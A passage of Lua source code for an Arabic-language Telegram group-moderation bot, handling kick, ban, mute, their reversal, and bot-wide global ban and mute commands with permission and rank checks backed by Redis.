bot.setChatMemberStatus(msg.chat_id,UserName,'banned',0)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).i,"md",true)    
end
if text and text:match('^طرد @(%S+)$') then
local UserName = text:match('^طرد @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:kik") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الطرد معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)
return false
end
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه طرد الاعضاء* ',"md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
if not Norank(UserId_Info.id,msg.chat_id) then
t = "*‹ : لا يمكنك طرد "..Get_Rank(UserId_Info.id,msg.chat_id).." .*"
else
t = "*‹ : تم طرده بنجاح .*"
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'banned',0)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).i,"md",true)    
end
if text == "طرد" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:kik") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الطرد معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)
return false
end
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه طرد الاعضاء* ',"md",true)  
return false
end
if not Norank(Remsg.sender.user_id,msg.chat_id) then
t = "*‹ : لا يمكنك طرد "..Get_Rank(Remsg.sender.user_id,msg.chat_id).." .*"
else
t = "*‹ : تم طرده بنجاح .*"
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'banned',0)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).i,"md",true)    
end
if text and text:match('^حظر (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^حظر (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:bn") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الحظر معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)  
return false
end
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه حظر الاعضاء* ',"md",true)  
return false
end
if not Norank(UserName,msg.chat_id) then
t = "*‹ : لا يمكنك حظر "..Get_Rank(UserName,msg.chat_id).." .*"
else
t = "*‹ : تم حظره بنجاح .*"
bot.setChatMemberStatus(msg.chat_id,UserName,'banned',0)
redis:sadd(bot_id..":"..msg.chat_id..":Ban",UserName)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).i,"md",true)    
end
if text and text:match('^حظر @(%S+)$') then
local UserName = text:match('^حظر @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:bn") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الحظر معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)  
return false
end
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه حظر الاعضاء* ',"md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
if not Norank(UserId_Info.id,msg.chat_id) then
t = "*‹ : لا يمكنك حظر "..Get_Rank(UserId_Info.id,msg.chat_id).." .*"
else
t = "*‹ : تم حظره بنجاح .*"
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'banned',0)
redis:sadd(bot_id..":"..msg.chat_id..":Ban",UserId_Info.id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).i,"md",true)    
end
if text == "حظر" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:bn") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الحظر معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)  
return false
end
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه حظر الاعضاء* ',"md",true)  
return false
end
if not Norank(Remsg.sender.user_id,msg.chat_id) then
t = "*‹ : لا يمكنك حظر "..Get_Rank(Remsg.sender.user_id,msg.chat_id).." .*"
else
t = "*‹ : تم حظره بنجاح .*"
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'banned',0)
redis:sadd(bot_id..":"..msg.chat_id..":Ban",Remsg.sender.user_id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).i,"md",true)    
end
if text and text:match('^الغاء حظر (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^الغاء حظر (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
t = "*‹ : تم الغاء حظره بنجاح .*"
redis:srem(bot_id..":"..msg.chat_id..":Ban",UserName)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).i,"md",true)    
bot.setChatMemberStatus(msg.chat_id,UserName,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text and text:match('^الغاء حظر @(%S+)$') then
local UserName = text:match('^الغاء حظر @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
t = "*‹ : تم الغاء حظره بنجاح .*"
redis:srem(bot_id..":"..msg.chat_id..":Ban",UserId_Info.id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).i,"md",true)  
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text == "الغاء حظر" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
t = "*‹ : تم الغاء حظره بنجاح .*"
redis:srem(bot_id..":"..msg.chat_id..":Ban",Remsg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).i,"md",true)    
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text and text:match('^كتم (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^كتم (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:ktm") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الكتم معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)  
return false
end
end
if not Norank(UserName,msg.chat_id) then
t = "*‹ : لا يمكنك كتم "..Get_Rank(UserName,msg.chat_id).." .*"
else
t = "*‹ : تم كتمه بنجاح .*"
redis:sadd(bot_id..":"..msg.chat_id..":silent",UserName)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).i,"md",true)    
end
if text and text:match('^كتم @(%S+)$') then
local UserName = text:match('^كتم @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:ktm") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الكتم معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)  
return false
end
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
if not Norank(UserId_Info.id,msg.chat_id) then
t = "*‹ : لا يمكنك كتم "..Get_Rank(UserId_Info.id,msg.chat_id).." .*"
else
t = "*‹ : تم كتمه بنجاح .*"
redis:sadd(bot_id..":"..msg.chat_id..":silent",UserId_Info.id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).i,"md",true)    
end
if text == "كتم" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:ktm") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الكتم معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)  
return false
end
end
if not Norank(Remsg.sender.user_id,msg.chat_id) then
t = "*‹ : لا يمكنك كتم "..Get_Rank(Remsg.sender.user_id,msg.chat_id).." .*"
else
t = "*‹ : تم كتمه بنجاح .*"
redis:sadd(bot_id..":"..msg.chat_id..":silent",Remsg.sender.user_id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).i,"md",true)    
end
if text and text:match('^الغاء كتم (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^الغاء كتم (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
t = "*‹ : تم الغاء كتمه بنجاح .*"
redis:srem(bot_id..":"..msg.chat_id..":silent",UserName)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).i,"md",true)    
end
if text and text:match('^الغاء كتم @(%S+)$') then
local UserName = text:match('^الغاء كتم @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
t = "*‹ : تم الغاء كتمه بنجاح .*"
redis:srem(bot_id..":"..msg.chat_id..":silent",UserId_Info.id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).i,"md",true)  
end
if text == "الغاء كتم" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
t = "*‹ : تم الغاء كتمه بنجاح .*"
redis:srem(bot_id..":"..msg.chat_id..":silent",Remsg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).i,"md",true)  
end
if text == 'المكتومين' then
t = '\n*‹ : قائمه '..text..'  \nٴ━═━═━═━═━═━═━═━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":silent") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : لا يوجد "..text:gsub('ال',"").." .*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.." .*"..k.." ‹ : *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.." .*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المقيدين' then
t = '\n*‹ : قائمه '..text..'  \nٴ━═━═━═━═━═━═━═━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":restrict") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : لا يوجد "..text:gsub('ال',"").." .*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.." .*"..k.." ‹ : *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.." .*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المحظورين' then
t = '\n*‹ : قائمه '..text..'  \nٴ━═━═━═━═━═━═━═━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Ban") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : لا يوجد "..text:gsub('ال',"").." .*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.." .*"..k.." ‹ : *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.." .*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'مسح المحظورين' and Owner(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Ban") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم حذف "..text:gsub('مسح',"").." سابقا .*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
bot.setChatMemberStatus(msg.chat_id,v,'restricted',{1,1,1,1,1,1,1,1,1})
end
redis:del(bot_id..":"..msg.chat_id..":Ban") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").yu,"md",true)  
end
if text == 'مسح المكتومين' and Owner(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":silent") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم حذف "..text:gsub('مسح',"").." سابقا .*").yu,"md",true)  
return false
end  
redis:del(bot_id..":"..msg.chat_id..":silent") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").yu,"md",true)  
end
if text == 'مسح المقيدين' and Owner(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":restrict") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم حذف "..text:gsub('مسح',"").." سابقا .*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
bot.setChatMemberStatus(msg.chat_id,v,'restricted',{1,1,1,1,1,1,1,1,1})
end
redis:del(bot_id..":"..msg.chat_id..":restrict") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").yu,"md",true)  
end
end
if programmer(msg)  then
if text and text:match('^كتم عام (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^كتم عام (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if not Isrank(UserName,msg.chat_id) then
t = "*‹ : لا يمكنك كتم "..Get_Rank(UserName,msg.chat_id).." .*"
else
t = "*‹ : تم كتمه عام بنجاح .*"
redis:sadd(bot_id..":bot:silent",UserName)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).i,"md",true)    
end
if text and text:match('^كتم عام @(%S+)$') then
local UserName = text:match('^كتم عام @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
if not Isrank(UserId_Info.id,msg.chat_id) then
t = "*‹ : لا يمكنك كتم "..Get_Rank(UserId_Info.id,msg.chat_id).." .*"
else
t = "*‹ : تم كتمه عام بنجاح .*"
redis:sadd(bot_id..":bot:silent",UserId_Info.id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).i,"md",true)    
end
if text == "كتم عام" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
if not Isrank(Remsg.sender.user_id,msg.chat_id) then
t = "*‹ : لا يمكنك كتم "..Get_Rank(Remsg.sender.user_id,msg.chat_id).." .*"
else
t = "*‹ : تم كتمه عام بنجاح .*"
redis:sadd(bot_id..":bot:silent",Remsg.sender.user_id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).i,"md",true)    
end
if text and text:match('^الغاء كتم عام (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^الغاء كتم عام (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
t = "*‹ : تم الغاء كتم العام بنجاح .*"
redis:srem(bot_id..":bot:silent",UserName)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).i,"md",true)    
end
if text and text:match('^الغاء كتم عام @(%S+)$') then
local UserName = text:match('^الغاء كتم عام @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
t = "*‹ : تم الغاء كتم العام بنجاح .*"
redis:srem(bot_id..":bot:silent",UserId_Info.id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).i,"md",true)  
end
if text == "الغاء كتم عام" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
t = "*‹ : تم الغاء كتم العام بنجاح .*"
redis:srem(bot_id..":bot:silent",Remsg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).i,"md",true)  
end
if text == 'المكتومين عام' then
t = '\n*‹ : قائمه '..text..'  \nٴ━═━═━═━═━═━═━═━ *\n'
local Info_ = redis:smembers(bot_id..":bot:silent") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : لا يوجد "..text:gsub('ال',"").." .*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.." .*"..k.." ‹ : *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.." .*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'مسح المكتومين عام' then
local Info_ = redis:smembers(bot_id..":bot:silent") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم حذف"..text:gsub('مسح',"").." سابقا .*").yu,"md",true)
return false
end  
redis:del(bot_id..":bot:silent") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").yu,"md",true)  
end
if text and text:match('^حظر عام (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^حظر عام (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه حظر عام الاعضاء* ',"md",true)  
return false
end
if not Isrank(UserName,msg.chat_id) then
t = "*‹ : لا يمكنك حظر عام "..Get_Rank(UserName,msg.chat_id).." .*"
else
t = "*‹ : تم حظره عام بنجاح .*"
bot.setChatMemberStatus(msg.chat_id,UserName,'banned',0)
redis:sadd(bot_id..":bot:Ban",UserName)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).i,"md",true)    
end
if text and text:match('^حظر عام @(%S+)$') then
local UserName = text:match('^حظر عام @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه حظر عام الاعضاء* ',"md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
if not Isrank(UserId_Info.id,msg.chat_id) then
t = "*‹ : لا يمكنك حظر عام "..Get_Rank(UserId_Info.id,msg.chat_id).." .*"
else
t = "*‹ : تم حظره عام بنجاح .*"
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'banned',0)
redis:sadd(bot_id..":bot:Ban",UserId_Info.id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).i,"md",true)    
end
if text == "حظر عام" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه حظر عام الاعضاء* ',"md",true)  
return false
end
if not Isrank(Remsg.sender.user_id,msg.chat_id) then
t = "*‹ : لا يمكنك حظر عام "..Get_Rank(Remsg.sender.user_id,msg.chat_id).." .*"
else
t = "*‹ : تم حظره عام بنجاح .*"
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'banned',0)
redis:sadd(bot_id..":bot:Ban",Remsg.sender.user_id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).i,"md",true)    
end
if text and text:match('^الغاء حظر عام (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^الغاء حظر عام (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
t = "*‹ : تم الغاء حظر العام بنجاح .*"
redis:srem(bot_id..":bot:Ban",UserName)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).i,"md",true)    
bot.setChatMemberStatus(msg.chat_id,UserName,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text and text:match('^الغاء حظر عام @(%S+)$') then
local UserName = text:match('^الغاء حظر عام @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
t = "*‹ : تم الغاء حظر العام بنجاح .*"
redis:srem(bot_id..":bot:Ban",UserId_Info.id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).i,"md",true)  
